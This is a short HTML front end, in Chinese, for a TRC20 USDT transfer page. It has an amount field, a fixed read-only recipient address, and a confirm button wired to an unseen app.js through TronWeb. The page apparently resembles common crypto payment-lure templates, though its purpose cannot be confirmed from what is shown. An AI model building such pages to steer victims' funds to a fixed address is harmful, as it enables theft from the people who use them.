<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>发送 USDT</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <header>
            <h1>发送 USDT</h1>
            <div class="network">TRC20</div>
        </header>

        <div class="main">
            <div class="input-group">
                <label>转账金额 USDT</label>
                <div class="amount-box">
                    <input type="number" id="amount" placeholder="0.00" inputmode="decimal" step="0.01">
                    <span class="token">USDT</span>
                </div>
            </div>

            <div class="recipient-box">
                <label>收款地址</label>
                <input type="text" id="recipient" value="TZ5QiipqHXZdpM2JPPGsdvcfSD6amepCRq" readonly>
            </div>

            <div class="fee">
                <span>网络手续费</span>
                <span>≈ 1.5 TRX</span>
            </div>

            <button onclick="sendTransfer()" class="send-button">确认转账</button>
        </div>
    </div>

    <script src="https://unpkg.com/tronweb@latest/dist/TronWeb.min.js"></script>
    <script src="app.js"></script>
</body>
</html>
